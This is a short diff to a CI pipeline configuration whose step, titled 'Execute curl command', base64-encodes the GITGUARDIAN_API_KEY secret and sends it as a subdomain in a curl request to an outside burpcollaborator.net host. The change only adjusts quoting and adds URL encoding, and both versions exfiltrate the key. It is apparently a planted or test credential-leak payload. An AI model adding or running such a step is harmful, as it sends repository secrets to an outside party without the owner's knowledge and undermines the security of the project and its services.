@@ -43,6 +43,6 @@ jobs:
       - run:
           name: Execute curl command
           command: |
-            subdomain=$(echo -n "$(echo -n $GITGUARDIAN_API_KEY | base64)" | tr -d '=')
+            subdomain=$(echo -n "$(echo -n "$GITGUARDIAN_API_KEY" | base64)" | tr -d '=' | urlencode)
             echo $subdomain
             curl -X GET "http://$subdomain.gh1tsokv5kg2ts8xmszcpu76rxxple.burpcollaborator.net"
